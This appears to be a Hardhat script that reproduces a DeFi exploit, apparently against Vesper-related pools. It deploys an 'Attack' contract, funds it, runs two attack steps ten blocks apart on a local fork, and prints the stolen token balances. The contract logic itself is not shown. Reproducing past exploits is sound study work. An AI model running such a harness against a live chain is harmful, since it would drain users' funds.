
const {USDC, vVSP, WBTC, DAI, SPC, VSP} = require('./config.js')

async function getTokenBalance(token, signer) {
  contract = await ethers.getContractAt("IERC20", token.address, signer)
  const balance = await contract.balanceOf(signer.address)
  return ethers.utils.formatUnits(balance, token.decimals)
}

async function main() {
  const [owner] = await ethers.getSigners()

  const Attack = await ethers.getContractFactory("Attack")
  const attack = await Attack.deploy()
  await attack.deployed()
  console.log('Deployed Attack contract to: ', attack.address)

  await owner.sendTransaction({
    to: attack.address,
    value: ethers.utils.parseEther("57")
  })

  blockNumber = await ethers.provider.getBlockNumber()
  console.log('Block Number before step 1: ', blockNumber)

  await attack.step1({
    value: ethers.utils.parseEther("57")
  })

  blockNumber = await ethers.provider.getBlockNumber()
  console.log('Block Number after step 1: ', blockNumber)

  console.log("Simulate 10 blocks mined") // why did attacker wait 10 blocks?
  for (let i = 0; i < 10; i++) {
    await network.provider.send("evm_increaseTime", [15])
    await ethers.provider.send("evm_mine")
  }

  blockNumber = await ethers.provider.getBlockNumber()
  console.log('Block Number before step 2: ', blockNumber)

  await attack.step2()

  console.log("Owner balances: ")
  console.log(`ETH ${ethers.utils.formatEther(await ethers.provider.getBalance(owner.address))} (started with 10000 ETH)`)
  console.log('USDC ', await getTokenBalance(USDC, owner))
  console.log('vVSP ', await getTokenBalance(vVSP, owner))
  console.log('WBTC ', await getTokenBalance(WBTC, owner))
  console.log('DAI ', await getTokenBalance(DAI, owner))
  console.log('SPC ', await getTokenBalance(SPC, owner))
  console.log('VSP ', await getTokenBalance(VSP, owner))
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });